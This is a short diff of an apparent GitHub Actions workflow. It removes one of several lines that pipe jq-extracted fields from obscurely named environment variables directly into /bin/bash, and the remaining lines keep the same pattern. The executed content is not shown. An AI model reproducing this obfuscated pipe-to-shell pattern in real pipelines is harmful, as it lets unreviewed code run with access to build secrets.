@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$urdt6" | jq -r .e4950 | /bin/bash
           echo $wny77662 | jq -r .ad313 | /bin/bash
           printf '%s' "$sx5" | jq -r .kpcyt7 | /bin/bash
-          printf '%s' "$x98" | jq -r .ol8082 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
